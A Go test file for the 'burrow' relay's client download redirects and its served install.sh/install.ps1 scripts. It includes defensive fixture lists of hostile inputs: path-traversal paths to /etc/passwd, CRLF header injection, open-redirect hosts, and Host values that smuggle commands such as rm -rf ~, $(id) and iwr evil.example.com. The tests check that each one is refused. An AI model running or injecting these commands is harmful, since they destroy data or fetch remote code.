package api

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"testing"

	"github.com/ankoehn/burrow/internal/api/install"
	"github.com/ankoehn/burrow/internal/version"
)

const testDownloadBase = "https://downloads.example.com/burrow/releases/download"

// withVersion sets the relay's build version for one test.
func withVersion(t *testing.T, v string) {
	t.Helper()
	old := version.Version
	version.Version = v
	t.Cleanup(func() { version.Version = old })
}

// handOut sends one request to the router and returns the response and body.
func handOut(t *testing.T, d Deps, method, target, host string) (*http.Response, string) {
	t.Helper()
	if d.Log == nil {
		d.Log = discardLog()
	}
	req := httptest.NewRequest(method, "http://relay.test/", nil)
	u, err := url.ParseRequestURI(target)
	if err != nil {
		// A target Go's parser refuses (a raw control byte) is set as it is.
		u = &url.URL{Path: target}
	}
	req.URL = u
	req.RequestURI = target
	if host != "" {
		req.Host = host
	} else {
		req.Host = "burrow.example.com"
	}
	rec := httptest.NewRecorder()
	NewRouter(d).ServeHTTP(rec, req)
	resp := rec.Result()
	raw, _ := io.ReadAll(resp.Body)
	return resp, string(raw)
}

func pairsOf(ps []clientPlatform) []string {
	var out []string
	for _, p := range ps {
		out = append(out, p.OS+"/"+p.Arch)
	}
	sort.Strings(out)
	return out
}

func repoFile(t *testing.T, rel string) string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join("..", "..", filepath.FromSlash(rel)))
	if err != nil {
		t.Fatalf("read %s: %v", rel, err)
	}
	return string(raw)
}

func yamlList(t *testing.T, block, key string) []string {
	t.Helper()
	m := regexp.MustCompile(`(?m)^\s+` + key + `:\s*\[([^\]]*)\]`).FindStringSubmatch(block)
	if m == nil {
		t.Fatalf("no %s list in the client build", key)
	}
	var out []string
	for _, f := range strings.Split(m[1], ",") {
		out = append(out, strings.Trim(strings.TrimSpace(f), `"`))
	}
	return out
}

// The release table must be what goreleaser builds for the client: the
// goos × goarch product of the `client` build minus its ignore list.
func TestClientPlatforms_MatchGoreleaser(t *testing.T) {
	cfg := repoFile(t, ".goreleaser.yml")
	builds, _, ok := strings.Cut(cfg, "\narchives:")
	if !ok {
		t.Fatal(".goreleaser.yml has no archives section")
	}
	i := strings.Index(builds, "\n  - id: client\n")
	if i < 0 {
		t.Fatal(".goreleaser.yml has no client build")
	}
	block := builds[i+1:]
	if j := strings.Index(block[1:], "\n  - id:"); j >= 0 {
		block = block[:j+1]
	}
	ignored := map[string]bool{}
	for _, m := range regexp.MustCompile(`- goos: (\w+)\s+goarch: "?(\w+)"?`).FindAllStringSubmatch(block, -1) {
		ignored[m[1]+"/"+m[2]] = true
	}
	if len(ignored) == 0 {
		t.Fatal("no ignore list found in the client build; the parser no longer fits the file")
	}
	var want []string
	for _, goos := range yamlList(t, block, "goos") {
		for _, goarch := range yamlList(t, block, "goarch") {
			if !ignored[goos+"/"+goarch] {
				want = append(want, goos+"/"+goarch)
			}
		}
	}
	sort.Strings(want)
	if got := pairsOf(releasePlatforms); strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("releasePlatforms = %v\n.goreleaser.yml builds %v", got, want)
	}
	if len(want) != 8 {
		t.Fatalf("the release builds %d pairs, the controller ruling names 8: %v", len(want), want)
	}

	// The archive name the table yields is the client archive's name_template.
	_, archives, _ := strings.Cut(cfg, "\narchives:")
	k := strings.Index(archives, "\n  - id: client\n")
	if k < 0 {
		t.Fatal(".goreleaser.yml has no client archive")
	}
	tmpl := strings.Join(strings.Fields(archives[k:]), " ")
	const wantTmpl = `name_template: >- burrow_{{ .Os }}_ {{- if eq .Arch "arm" }}armv7 {{- else }}{{ .Arch }}{{ end }}_ {{- .Version }} format_overrides: - goos: windows formats: [zip]`
	if !strings.Contains(tmpl, wantTmpl) || !strings.Contains(tmpl, "formats: [tar.gz]") {
		t.Fatalf("the client archive's name_template changed; update archiveName with it:\n%s", tmpl)
	}
	if !strings.Contains(cfg, "checksum:\n  name_template: 'checksums.txt'") {
		t.Fatal("the release's checksum file is no longer checksums.txt")
	}
}

// The develop table must be the list develop.yml loops over.
func TestClientPlatforms_MatchDevelopWorkflow(t *testing.T) {
	wf := repoFile(t, ".github/workflows/develop.yml")
	m := regexp.MustCompile(`for t in ([a-z0-9/ ]+); do`).FindStringSubmatch(wf)
	if m == nil {
		t.Fatal("develop.yml has no `for t in …; do` build loop")
	}
	want := strings.Fields(m[1])
	sort.Strings(want)
	if got := pairsOf(developPlatforms); strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("developPlatforms = %v\ndevelop.yml builds %v", got, want)
	}
	for _, line := range []string{
		`zip -qj "dist/burrow_${os}_${arch}.zip"  "burrow${ext}"`,
		`tar -czf "dist/burrow_${os}_${arch}.tar.gz"  "burrow${ext}"`,
		`(cd dist && sha256sum * > checksums.txt)`,
		`tag_name: develop`,
	} {
		if !strings.Contains(wf, line) {
			t.Fatalf("develop.yml no longer has %q; update archiveName with it", line)
		}
	}
}

func TestArchiveName(t *testing.T) {
	release := map[string]string{
		"linux/amd64":   "burrow_linux_amd64_0.6.0.tar.gz",
		"linux/arm64":   "burrow_linux_arm64_0.6.0.tar.gz",
		"linux/arm":     "burrow_linux_armv7_0.6.0.tar.gz",
		"linux/386":     "burrow_linux_386_0.6.0.tar.gz",
		"darwin/amd64":  "burrow_darwin_amd64_0.6.0.tar.gz",
		"darwin/arm64":  "burrow_darwin_arm64_0.6.0.tar.gz",
		"windows/amd64": "burrow_windows_amd64_0.6.0.zip",
		"windows/386":   "burrow_windows_386_0.6.0.zip",
	}
	develop := map[string]string{
		"linux/amd64":   "burrow_linux_amd64.tar.gz",
		"linux/arm64":   "burrow_linux_arm64.tar.gz",
		"darwin/arm64":  "burrow_darwin_arm64.tar.gz",
		"windows/amd64": "burrow_windows_amd64.zip",
	}
	if len(releasePlatforms) != len(release) || len(developPlatforms) != len(develop) {
		t.Fatalf("tables hold %d and %d pairs, want %d and %d", len(releasePlatforms), len(developPlatforms), len(release), len(develop))
	}
	for _, v := range []string{"0.6.0", "v0.6.0"} {
		for pair, want := range release {
			goos, goarch, _ := strings.Cut(pair, "/")
			if got, ok := archiveName(v, goos, goarch); !ok || got != want {
				t.Errorf("archiveName(%q, %s) = %q, %v; want %q", v, pair, got, ok, want)
			}
		}
	}
	for _, v := range []string{"develop", "dev", "", "0.6.0-12-gabc", "a17ef04", "0.6", "1.2.3.4", "0.6.0-rc1", "v", "0.6.0\n"} {
		for pair, want := range develop {
			goos, goarch, _ := strings.Cut(pair, "/")
			if got, ok := archiveName(v, goos, goarch); !ok || got != want {
				t.Errorf("archiveName(%q, %s) = %q, %v; want %q", v, pair, got, ok, want)
			}
		}
		// A pair only the tagged release builds does not exist on develop.
		for _, pair := range []string{"linux/arm", "linux/386", "darwin/amd64", "windows/386"} {
			goos, goarch, _ := strings.Cut(pair, "/")
			if got, ok := archiveName(v, goos, goarch); ok {
				t.Errorf("archiveName(%q, %s) = %q, want none", v, pair, got)
			}
		}
	}
	for _, pair := range []string{"linux/mips", "plan9/amd64", "darwin/386", "windows/arm64", "darwin/arm", "LINUX/AMD64", "/", "linux/", "../..", "linux/amd64\x00"} {
		goos, goarch, _ := strings.Cut(pair, "/")
		if got, ok := archiveName("0.6.0", goos, goarch); ok {
			t.Errorf("archiveName(0.6.0, %q) = %q, want none", pair, got)
		}
	}
}

func TestClientDownload_ReleaseRedirects(t *testing.T) {
	withVersion(t, "0.6.0")
	d := Deps{ClientDownloadBase: testDownloadBase}
	cases := map[string]string{
		"/download/burrow/linux/amd64":   testDownloadBase + "/v0.6.0/burrow_linux_amd64_0.6.0.tar.gz",
		"/download/burrow/linux/arm":     testDownloadBase + "/v0.6.0/burrow_linux_armv7_0.6.0.tar.gz",
		"/download/burrow/darwin/arm64":  testDownloadBase + "/v0.6.0/burrow_darwin_arm64_0.6.0.tar.gz",
		"/download/burrow/windows/amd64": testDownloadBase + "/v0.6.0/burrow_windows_amd64_0.6.0.zip",
		"/download/burrow/windows/386":   testDownloadBase + "/v0.6.0/burrow_windows_386_0.6.0.zip",
		"/download/burrow/checksums.txt": testDownloadBase + "/v0.6.0/checksums.txt",
	}
	for target, want := range cases {
		for _, method := range []string{http.MethodGet, http.MethodHead} {
			resp, _ := handOut(t, d, method, target, "")
			if resp.StatusCode != http.StatusFound || resp.Header.Get("Location") != want {
				t.Errorf("%s %s: %d Location %q, want 302 %q", method, target, resp.StatusCode, resp.Header.Get("Location"), want)
			}
			if ch := resp.Header.Get("Burrow-Channel"); ch != "" {
				t.Errorf("%s %s: Burrow-Channel %q on a tagged build", method, target, ch)
			}
			if len(resp.Cookies()) != 0 {
				t.Errorf("%s set a cookie", target)
			}
		}
	}
	// Every pair the release builds answers 302.
	for _, p := range releasePlatforms {
		resp, _ := handOut(t, d, http.MethodGet, "/download/burrow/"+p.OS+"/"+p.Arch, "")
		if resp.StatusCode != http.StatusFound {
			t.Errorf("%s/%s: %d, want 302", p.OS, p.Arch, resp.StatusCode)
		}
	}
}

func TestClientDownload_DefaultBaseIsThisRepository(t *testing.T) {
	withVersion(t, "0.6.0")
	resp, _ := handOut(t, Deps{}, http.MethodGet, "/download/burrow/linux/amd64", "")
	const want = "https://github.com/andreas-koehn/burrow/releases/download/v0.6.0/burrow_linux_amd64_0.6.0.tar.gz"
	if got := resp.Header.Get("Location"); resp.StatusCode != http.StatusFound || got != want {
		t.Fatalf("%d Location %q, want 302 %q", resp.StatusCode, got, want)
	}
}

func TestClientDownload_UntaggedBuildUsesDevelop(t *testing.T) {
	for _, v := range []string{"develop", "dev", "", "0.6.0-12-gabc", "a17ef04"} {
		withVersion(t, v)
		d := Deps{ClientDownloadBase: testDownloadBase}
		cases := map[string]string{
			"/download/burrow/linux/amd64":   testDownloadBase + "/develop/burrow_linux_amd64.tar.gz",
			"/download/burrow/windows/amd64": testDownloadBase + "/develop/burrow_windows_amd64.zip",
			"/download/burrow/checksums.txt": testDownloadBase + "/develop/checksums.txt",
		}
		for target, want := range cases {
			resp, _ := handOut(t, d, http.MethodGet, target, "")
			if resp.StatusCode != http.StatusFound || resp.Header.Get("Location") != want {
				t.Errorf("version %q %s: %d Location %q, want 302 %q", v, target, resp.StatusCode, resp.Header.Get("Location"), want)
			}
			if ch := resp.Header.Get("Burrow-Channel"); ch != "develop" {
				t.Errorf("version %q %s: Burrow-Channel %q, want develop", v, target, ch)
			}
		}
		// A pair only the tagged release builds: 404 with the develop list.
		resp, body := handOut(t, d, http.MethodGet, "/download/burrow/darwin/amd64", "")
		if resp.StatusCode != http.StatusNotFound || !strings.Contains(body, "darwin/arm64, linux/amd64, linux/arm64, windows/amd64") {
			t.Errorf("version %q darwin/amd64: %d %q", v, resp.StatusCode, body)
		}
	}
}

func TestClientDownload_UnknownPlatformAndOddInput(t *testing.T) {
	withVersion(t, "0.6.0")
	spa := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, "<!doctype html>")
	})
	d := Deps{ClientDownloadBase: testDownloadBase, SPA: spa}
	for _, target := range []string{
		"/download/burrow/linux/mips",
		"/download/burrow/plan9/amd64",
		"/download/burrow/darwin/386",
		"/download/burrow/windows/arm64",
		"/download/burrow/LINUX/AMD64",
		"/download/burrow/linux/amd64/extra",
		"/download/burrow/linux/amd64%00",
		"/download/burrow/linux/amd64%0d%0aSet-Cookie:x=1",
		"/download/burrow/../../etc/passwd",
		"/download/burrow/..%2f..%2fetc%2fpasswd",
		"/download/burrow/%2e%2e/%2e%2e",
		"/download/burrow/linux//amd64",
		"/download/burrow//evil.example.com/x",
		"/download/burrow/https:%2f%2fevil.example.com/x",
		"/download/burrow/linux",
		"/download/burrow/",
		"/download/burrow",
		"/download/burrowd/linux/amd64",
		"/download/",
		"/download",
		"/download/burrow/checksums.txt/x",
		"/download/burrow/CHECKSUMS.TXT",
	} {
		resp, body := handOut(t, d, http.MethodGet, target, "")
		if resp.StatusCode != http.StatusNotFound {
			t.Errorf("%s: %d, want 404", target, resp.StatusCode)
		}
		if loc := resp.Header.Get("Location"); loc != "" {
			t.Errorf("%s: Location %q on a 404", target, loc)
		}
		if strings.Contains(body, "<!doctype") {
			t.Errorf("%s: answered by the SPA", target)
		}
		if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, "text/plain") {
			t.Errorf("%s: Content-Type %q, want text/plain", target, ct)
		}
		if !strings.Contains(body, "linux/amd64") || !strings.Contains(body, "windows/386") {
			t.Errorf("%s: body does not list the supported pairs: %q", target, body)
		}
		// Nothing of the request is echoed.
		for _, echo := range []string{"mips", "plan9", "evil", "passwd", "Set-Cookie", "LINUX"} {
			if strings.Contains(body, echo) {
				t.Errorf("%s: body echoes %q", target, echo)
			}
		}
	}
	for _, target := range []string{"/download/burrow/linux/amd64", "/download/burrow/checksums.txt"} {
		resp, body := handOut(t, d, http.MethodPost, target, "")
		if resp.StatusCode != http.StatusMethodNotAllowed || strings.Contains(body, "<!doctype") || resp.Header.Get("Location") != "" {
			t.Errorf("POST %s: %d %q", target, resp.StatusCode, body)
		}
	}
	// The same paths with the SPA present still redirect for a real pair.
	resp, body := handOut(t, d, http.MethodGet, "/download/burrow/linux/amd64", "")
	if resp.StatusCode != http.StatusFound || strings.Contains(body, "<!doctype") {
		t.Fatalf("with the SPA: %d %q", resp.StatusCode, body)
	}
}

// The target of a redirect is the configured base, a tag from the build's
// version and a name from the table. Nothing of the request reaches it.
func TestClientDownload_RedirectStaysOnTheConfiguredHost(t *testing.T) {
	withVersion(t, "0.6.0")
	d := Deps{ClientDownloadBase: testDownloadBase}
	allowed := map[string]bool{testDownloadBase + "/v0.6.0/checksums.txt": true}
	for _, p := range releasePlatforms {
		name, _ := archiveName("0.6.0", p.OS, p.Arch)
		allowed[testDownloadBase+"/v0.6.0/"+name] = true
	}
	segs := []string{"linux", "amd64", "windows", "386", "..", ".", "", "%2f", "%5c", "evil.example.com", "@evil.example.com",
		"https:", "%0d%0a", "checksums.txt", "x?y", "%3f", "%23", "amd64%20", "linux%2famd64", "\\evil.example.com"}
	for _, a := range segs {
		for _, b := range segs {
			for _, host := range []string{"", "evil.example.com", "evil.example.com:443"} {
				target := "/download/burrow/" + a + "/" + b
				resp, _ := handOut(t, d, http.MethodGet, target, host)
				loc := resp.Header.Get("Location")
				switch resp.StatusCode {
				case http.StatusFound:
					if !allowed[loc] {
						t.Errorf("%s (Host %q): redirect to %q, not one of the release's files", target, host, loc)
					}
				case http.StatusNotFound:
					if loc != "" {
						t.Errorf("%s: Location %q on a 404", target, loc)
					}
				default:
					t.Errorf("%s: status %d", target, resp.StatusCode)
				}
			}
		}
	}
}

// A base that is not a plain http(s) URL never reaches a Location header.
func TestClientDownload_BadBaseFallsBackToDefault(t *testing.T) {
	withVersion(t, "0.6.0")
	for _, base := range []string{"javascript:alert(1)", "https://x/\r\nSet-Cookie: a=b", "//evil.example.com", "https://u:p@x/y"} {
		resp, _ := handOut(t, Deps{ClientDownloadBase: base}, http.MethodGet, "/download/burrow/linux/amd64", "")
		if loc := resp.Header.Get("Location"); !strings.HasPrefix(loc, install.DefaultDownloadBase+"/v0.6.0/") {
			t.Errorf("base %q: Location %q", base, loc)
		}
	}
}

func TestClientDownload_FromDirectory(t *testing.T) {
	withVersion(t, "0.6.0")
	dir := t.TempDir()
	outside := t.TempDir()
	write := func(path, content string) {
		t.Helper()
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(filepath.Join(dir, "burrow_linux_amd64_0.6.0.tar.gz"), "tarball-bytes")
	write(filepath.Join(dir, "burrow_windows_amd64_0.6.0.zip"), "zip-bytes")
	write(filepath.Join(dir, "checksums.txt"), "abc  burrow_linux_amd64_0.6.0.tar.gz\n")
	write(filepath.Join(outside, "secret"), "outside-the-directory")
	if err := os.Symlink(filepath.Join(outside, "secret"), filepath.Join(dir, "burrow_linux_arm64_0.6.0.tar.gz")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := os.Mkdir(filepath.Join(dir, "burrow_darwin_arm64_0.6.0.tar.gz"), 0o755); err != nil {
		t.Fatal(err)
	}
	// The base is set too: the directory wins and nothing is redirected.
	d := Deps{ClientDownloadDir: dir, ClientDownloadBase: testDownloadBase}

	for target, want := range map[string][2]string{
		"/download/burrow/linux/amd64":   {"application/gzip", "tarball-bytes"},
		"/download/burrow/windows/amd64": {"application/zip", "zip-bytes"},
		"/download/burrow/checksums.txt": {"text/plain; charset=utf-8", "abc  burrow_linux_amd64_0.6.0.tar.gz\n"},
	} {
		resp, body := handOut(t, d, http.MethodGet, target, "")
		if resp.StatusCode != http.StatusOK || body != want[1] {
			t.Errorf("%s: %d %q, want 200 %q", target, resp.StatusCode, body, want[1])
		}
		if ct := resp.Header.Get("Content-Type"); ct != want[0] {
			t.Errorf("%s: Content-Type %q, want %q", target, ct, want[0])
		}
		if cl := resp.Header.Get("Content-Length"); cl != itoa(len(want[1])) {
			t.Errorf("%s: Content-Length %q, want %d", target, cl, len(want[1]))
		}
		if loc := resp.Header.Get("Location"); loc != "" {
			t.Errorf("%s: redirected to %q although a directory is set", target, loc)
		}
		head, headBody := handOut(t, d, http.MethodHead, target, "")
		if head.StatusCode != http.StatusOK || headBody != "" || head.Header.Get("Content-Length") != itoa(len(want[1])) {
			t.Errorf("HEAD %s: %d, body %q, Content-Length %q", target, head.StatusCode, headBody, head.Header.Get("Content-Length"))
		}
	}
	for target, why := range map[string]string{
		"/download/burrow/linux/arm":    "a file that is missing",
		"/download/burrow/linux/arm64":  "a symlink that leaves the directory",
		"/download/burrow/darwin/arm64": "a directory with an archive's name",
		"/download/burrow/linux/mips":   "an unknown pair",
	} {
		resp, body := handOut(t, d, http.MethodGet, target, "")
		if resp.StatusCode != http.StatusNotFound {
			t.Errorf("%s (%s): %d, want 404", target, why, resp.StatusCode)
		}
		if strings.Contains(body, "outside-the-directory") || strings.Contains(body, dir) || strings.Contains(body, outside) {
			t.Errorf("%s (%s): body discloses a file or path: %q", target, why, body)
		}
	}
}

func itoa(n int) string {
	const digits = "0123456789"
	if n == 0 {
		return "0"
	}
	var b []byte
	for ; n > 0; n /= 10 {
		b = append([]byte{digits[n%10]}, b...)
	}
	return string(b)
}

func TestInstallScripts_ServedWithRelayAndVersion(t *testing.T) {
	withVersion(t, "0.6.0")
	spa := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, "<!doctype html>")
	})
	d := Deps{SPA: spa, SecureCookies: true, ClientDownloadBase: testDownloadBase}

	resp, sh := handOut(t, d, http.MethodGet, "/install.sh", "burrow.example.com")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("/install.sh: %d without a session, want 200", resp.StatusCode)
	}
	if ct := resp.Header.Get("Content-Type"); ct != "text/x-shellscript; charset=utf-8" {
		t.Errorf("/install.sh Content-Type %q", ct)
	}
	if cc := resp.Header.Get("Cache-Control"); cc != "no-store" {
		t.Errorf("/install.sh Cache-Control %q, want no-store", cc)
	}
	if nos := resp.Header.Get("X-Content-Type-Options"); nos != "nosniff" {
		t.Errorf("/install.sh X-Content-Type-Options %q", nos)
	}
	if len(resp.Cookies()) != 0 {
		t.Error("/install.sh set a cookie")
	}
	if !strings.HasPrefix(sh, "#!/bin/sh\n") || strings.Contains(sh, "<!doctype") {
		t.Fatalf("/install.sh is not the script: %q", sh[:min(len(sh), 40)])
	}
	for _, want := range []string{`RELAY="https://burrow.example.com"`, `VERSION="0.6.0"`, `CHANNEL="release"`} {
		if n := strings.Count(sh, want); n != 1 {
			t.Errorf("/install.sh: %s appears %d times, want 1", want, n)
		}
	}
	// Every non-Windows pair of the channel, with the name the redirect uses.
	for _, p := range releasePlatforms {
		name, _ := archiveName("0.6.0", p.OS, p.Arch)
		line := p.OS + "/" + p.Arch + " " + name + "\n"
		if got := strings.Contains(sh, line); got != (p.OS != "windows") {
			t.Errorf("/install.sh: asset line %q present = %v", line, got)
		}
	}
	if !strings.Contains(sh, `MANUAL="https://downloads.example.com/burrow/releases/tag/v0.6.0"`) {
		t.Errorf("/install.sh lacks the manual download page")
	}

	resp, ps := handOut(t, d, http.MethodGet, "/install.ps1", "burrow.example.com:8443")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("/install.ps1: %d, want 200", resp.StatusCode)
	}
	if ct := resp.Header.Get("Content-Type"); ct != "text/plain; charset=utf-8" {
		t.Errorf("/install.ps1 Content-Type %q", ct)
	}
	if cc := resp.Header.Get("Cache-Control"); cc != "no-store" {
		t.Errorf("/install.ps1 Cache-Control %q", cc)
	}
	for _, want := range []string{`$Relay = 'https://burrow.example.com:8443'`, `$Version = '0.6.0'`, `'windows/amd64' = 'burrow_windows_amd64_0.6.0.zip'`} {
		if n := strings.Count(ps, want); n != 1 {
			t.Errorf("/install.ps1: %s appears %d times, want 1", want, n)
		}
	}

	// HEAD works; other methods do not reach the SPA.
	if resp, body := handOut(t, d, http.MethodHead, "/install.sh", ""); resp.StatusCode != http.StatusOK || body != "" {
		t.Errorf("HEAD /install.sh: %d, body %d bytes", resp.StatusCode, len(body))
	}
	if resp, body := handOut(t, d, http.MethodPost, "/install.sh", ""); resp.StatusCode != http.StatusMethodNotAllowed || strings.Contains(body, "<!doctype") {
		t.Errorf("POST /install.sh: %d %q", resp.StatusCode, body)
	}
}

// The scheme comes from the relay's own settings, never from a header.
func TestInstallScripts_Scheme(t *testing.T) {
	withVersion(t, "0.6.0")
	for _, c := range []struct {
		d    Deps
		want string
	}{
		{Deps{}, `RELAY="http://relay.test:8080"`},
		{Deps{SecureCookies: true}, `RELAY="https://relay.test:8080"`},
		{Deps{HTTPSEnabled: true}, `RELAY="https://relay.test:8080"`},
	} {
		_, sh := handOut(t, c.d, http.MethodGet, "/install.sh", "relay.test:8080")
		if !strings.Contains(sh, c.want) {
			t.Errorf("%+v: script lacks %s", c.d.SecureCookies || c.d.HTTPSEnabled, c.want)
		}
	}
	// A forwarded header from an untrusted peer changes nothing.
	d := Deps{Log: discardLog()}
	req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
	req.Host = "relay.test"
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Host", "evil.example.com")
	rec := httptest.NewRecorder()
	NewRouter(d).ServeHTTP(rec, req)
	if body := rec.Body.String(); !strings.Contains(body, `RELAY="http://relay.test"`) || strings.Contains(body, "evil") {
		t.Error("a forwarded header changed the relay address in the script")
	}
}

func TestInstallScripts_UntaggedBuildSaysDevelop(t *testing.T) {
	withVersion(t, "0.6.0-12-gabc\"; id; \"")
	d := Deps{SecureCookies: true}
	_, sh := handOut(t, d, http.MethodGet, "/install.sh", "burrow.example.com")
	for _, want := range []string{`VERSION="develop"`, `CHANNEL="develop"`, "linux/amd64 burrow_linux_amd64.tar.gz\n", "darwin/arm64 burrow_darwin_arm64.tar.gz\n",
		`MANUAL="https://github.com/andreas-koehn/burrow/releases/tag/develop"`} {
		if !strings.Contains(sh, want) {
			t.Errorf("/install.sh lacks %q", want)
		}
	}
	for _, banned := range []string{"gabc", "; id;", "linux/arm ", "linux/386", "darwin/amd64"} {
		if strings.Contains(sh, banned) {
			t.Errorf("/install.sh contains %q", banned)
		}
	}
	_, ps := handOut(t, d, http.MethodGet, "/install.ps1", "burrow.example.com")
	if !strings.Contains(ps, `$Version = 'develop'`) || !strings.Contains(ps, `'windows/amd64' = 'burrow_windows_amd64.zip'`) || strings.Contains(ps, "gabc") {
		t.Error("/install.ps1 does not name the develop build")
	}
}

// A relay that serves the archives itself points at no outside page.
func TestInstallScripts_DirectoryModeHasNoManualPage(t *testing.T) {
	withVersion(t, "0.6.0")
	_, sh := handOut(t, Deps{ClientDownloadDir: t.TempDir()}, http.MethodGet, "/install.sh", "burrow.example.com")
	if !strings.Contains(sh, `MANUAL=""`) || strings.Contains(sh, "github.com") {
		t.Error("directory mode: the script names an outside download page")
	}
}

// A Host header is the one request value that reaches a script. Anything but
// a plain host name with an optional port is refused, and the refusal does
// not repeat it.
func TestInstallScripts_HostileHostIsRefused(t *testing.T) {
	withVersion(t, "0.6.0")
	hosts := []string{
		`x"; rm -rf ~; "`,
		`burrow.example.com"; rm -rf ~; "`,
		"$(id)",
		"burrow.example.com$(id)",
		"`id`",
		"burrow.example.com`touch /tmp/pwned`",
		"burrow.example.com\nrm -rf ~",
		"burrow.example.com\r\nmain() { :; }",
		"burrow.example.com'; Remove-Item -Recurse C:\\; '",
		"burrow.example.com'+(iwr evil.example.com)+'",
		"burrow.example.com; id",
		"burrow.example.com/../x",
		"burrow.example.com\\x",
		"burrow.example.com #",
		"burrow.example.com:80:80",
		"burrow.example.com:",
		"user@burrow.example.com",
		"[::1]:8080",
		"${IFS}",
		"\x00",
		" ",
		strings.Repeat("a", 300),
	}
	for _, path := range []string{"/install.sh", "/install.ps1"} {
		for _, host := range hosts {
			d := Deps{Log: discardLog(), SecureCookies: true}
			req := httptest.NewRequest(http.MethodGet, path, nil)
			req.Host = host
			rec := httptest.NewRecorder()
			NewRouter(d).ServeHTTP(rec, req)
			body := rec.Body.String()
			if rec.Code != http.StatusBadRequest {
				t.Errorf("%s with Host %q: %d, want 400", path, host, rec.Code)
			}
			if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/plain") {
				t.Errorf("%s with Host %q: Content-Type %q", path, host, ct)
			}
			for _, echo := range []string{"rm -rf", "$(", "`", "Remove-Item", "iwr", "main()", "RELAY=", "$Relay", "#!/bin/sh", "aaaaaaaa"} {
				if strings.Contains(body, echo) {
					t.Errorf("%s with Host %q: the answer contains %q", path, host, echo)
				}
			}
		}
		// An empty Host (HTTP/1.0) is refused as well.
		req := httptest.NewRequest(http.MethodGet, path, nil)
		req.Host = ""
		rec := httptest.NewRecorder()
		NewRouter(Deps{Log: discardLog()}).ServeHTTP(rec, req)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("%s without a Host: %d, want 400", path, rec.Code)
		}
	}
}

// The hand-out routes need no session and are not the SPA's.
func TestClientHandOut_PublicAndBeforeTheSPA(t *testing.T) {
	withVersion(t, "0.6.0")
	spa := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, "<!doctype html>")
	})
	d := Deps{SPA: spa}
	for target, want := range map[string]int{
		"/install.sh":                    http.StatusOK,
		"/install.ps1":                   http.StatusOK,
		"/download/burrow/linux/amd64":   http.StatusFound,
		"/download/burrow/checksums.txt": http.StatusFound,
		"/download/anything/else":        http.StatusNotFound,
		"/install.sh/x":                  http.StatusOK, // not reserved: the SPA's own 404 page
	} {
		resp, body := handOut(t, d, http.MethodGet, target, "")
		if resp.StatusCode != want {
			t.Errorf("%s: %d, want %d", target, resp.StatusCode, want)
		}
		if target != "/install.sh/x" && strings.Contains(body, "<!doctype") {
			t.Errorf("%s was answered by the SPA", target)
		}
	}
}
